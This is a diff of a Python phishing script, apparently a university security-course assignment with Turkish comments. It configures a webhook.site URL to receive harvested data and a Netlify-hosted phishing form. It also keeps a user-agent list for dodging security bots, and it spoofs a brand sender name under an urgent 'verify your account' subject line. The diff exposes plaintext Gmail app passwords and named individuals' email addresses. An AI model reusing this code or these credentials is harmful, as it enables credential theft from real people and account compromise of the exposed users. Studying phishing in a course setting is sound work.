@@ -23,10 +23,10 @@ TARGET_WEBHOOK_URL = "https://webhook.site/ddffa832-be0c-4854-9578-fb0fe971e020"
 PHISHING_FORM_NETLIFY_URL = "https://cozy-salamander-8df772.netlify.app/index.html" # SİZİN NETLIFY ADRESİNİZ
 
 # --- SMTP AYARLARI (KENDİ BİLGİLERİNİZLE DEĞİŞTİRİN) ---
-SENDER_EMAIL = 'efeakgul.cs437@gmail.com' 
-SENDER_PASS = 'vezc uhvb itzc xnvg' # LÜTFEN YENİ ŞİFRENİZİ BURAYA GİRİN
-RECIPIENT_EMAIL = 'baris.kaplan@sabanciuniv.edu' # Hocanın mail adresi
-PHISHING_SENDER_NAME = 'Trendway Güvenlik' 
+SENDER_EMAIL = 'ifiakgl@gmail.com' 
+SENDER_PASS = 'chhk cpaf kksf djub' # LÜTFEN YENİ ŞİFRENİZİ BURAYA GİRİN
+RECIPIENT_EMAIL = 'efe.akgul@sabanciuniv.edu' # Hocanın mail adresi
+PHISHING_SENDER_NAME = 'Trendol Support' 
 
 # Güvenlik Botu User-Agent Anahtar Kelimeleri
 BOT_AGENTS = [
@@ -136,7 +136,7 @@ def send_mail(recipient, html_content):
     # 1. Başlıklara taklit edilen adı ekle
     msg['From'] = SENDER_FULL_NAME 
     msg['To'] = recipient
-    msg['Subject'] = 'BARIŞ SERHAT KAPLAN - ACİL: Hesap Güvenliğiniz İçin Doğrulama Gerekiyor'
+    msg['Subject'] = 'Efe Akgül, Verification Required for Account Security'
     
     msg.attach(MIMEText(html_content, 'html'))
     
